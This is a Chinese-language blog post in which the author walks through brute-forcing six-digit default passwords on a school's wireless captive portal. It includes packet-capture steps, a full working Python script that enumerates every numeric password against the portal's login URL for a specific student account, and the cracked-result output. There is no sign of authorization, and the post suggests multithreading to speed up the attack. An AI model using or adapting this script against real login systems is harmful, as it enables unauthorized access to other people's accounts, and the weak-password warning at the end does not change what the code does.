---
title: python脚本-暴力破解无线网弱密码 
date: 2019-04-26
---
**背景：学校最近重新架设无线网一体化，而初始密码为弱密码（6位数字），下面我们要做的就是通过暴力破解的方式破解弱密码！（所以建议大家以后无论是在注册还是什么情况，都千万不要使用弱密钥）**
**攻击过程如下：**
## 1.获取get参数
**在爆破之前我们需要获取一些get参数，这些参数应该包含着我们输入的登陆信息。**

登陆无线网前需要在网页上进行身份验证。
![验证界面](https://s2.ax1x.com/2019/04/26/Eni5OU.png)
随便输入一个账号密码，看返回结果是什么。比如输入学号：1122，密码：1231131，运营商选择联通。提示无账号，但是无所谓，毕竟我们的目的在于接下来的抓包环节。抓包看看get的网址，选择我们有用的，比如下图中get参数中包含了我们输入的信息。这很有用，因为这为我们下面的python脚本提供了url。
![获取输入的get参数](https://s2.ax1x.com/2019/04/26/EniomF.png)
看一下回显结果，提示`"result":"0"`等信息。
![验证失败回显内容](https://s2.ax1x.com/2019/04/26/EniTw4.png)
我们再输入一个正确的账号密码，将get参数中的user_account和user_password换成正确的（我自己的无线网认证账号密码，账号和密码就不公布了hhhhh），看一下正确登陆后的回显内容。显示`"result":"1","认证成功"`等信息。
![验证正确回显内容](https://s2.ax1x.com/2019/04/26/Eni7TJ.png)
ok，我们可以根据回显内容的不同来判断是否验证成功。下面就可以进行暴力破解了，只需要选定一个存在的账号，然后穷举6位数字密码的所有可能性，一一验证即可。

## python脚本暴力破解
直接上代码吧：

```
from time import strftime
from itertools import product
from time import sleep
import requests
from requests import post
import re
import threading    #可开启多线程
import time
 
def fx(iter=['0123456789']):
  def psgen(x):    #密码生成器，穷举所有的密码可能性，参数x表示密码长度
    for r in iter:
      for repeat in range(x,x+1):
        for ps in product(r,repeat=repeat):
          yield ''.join(ps)
  for ps in psgen(6):
    url='http://10.2.5.251:801/eportal/?c=Portal&a=login&callback=dr1556270398016&login_method=1&user_account=08xxxx05@unicom&user_password=%s&wlan_user_ip=10.3.37.27&wlan_user_mac=d07e351e9bbe&wlan_ac_ip=&wlan_ac_name=NAS&jsVersion=3.0&_=1556270388759'%ps
    try:
      s=requests.session()
      rs=s.get(url).content.decode('utf-8')
      r = re.findall(r'认证成功',rs)        #判断验证结果
      if r: 
        with open("resut.csv","a+") as f:    #存储密码结果到result.csv文件中
          f.write('密码破解成功结果为：,'+ ps + ',' + strftime("%c") + ',' + url+'\n')
        print('密码破解成功：'+ps+' ,'+rs)
        break
      else:
        print(ps+'密码不正确'+rs)
    except:
      sleep(1)
      pass
      
fx(['0123456789'])
```
接下来运行等待结果就ok了。看一下运行过程图：
![暴力破解过程图](https://s2.ax1x.com/2019/04/26/Enibk9.png)
由于一共的可能性有1000000种，而且每一次穷举都要进行一次网络验证，即每一次验证都有网络延时，所以要等上一会儿。大概爆破了一个多小时，终于爆出了正确结果。生成了result.csv文件，查看一下文件内容，如下所示：
```
密码破解成功结果为：,15xxxx,Fri Apr 26 17:28:19 2019,http://10.2.5.251:801/eportal/?c=Portal&a=login&callback=dr1556270398016&login_method=1&user_account=08xxxx05@unicom&user_password=15xxxx&wlan_user_ip=10.3.37.27&wlan_user_mac=d07e351e9bbe&wlan_ac_ip=&wlan_ac_name=NAS&jsVersion=3.0&_=1556270388759
```
**速度慢可以开启多线程，同时进行测试。结果好很多！**
#### 爆破完成，由此看见，弱密钥的危险性。如有错误或建议，请在评论出指出！
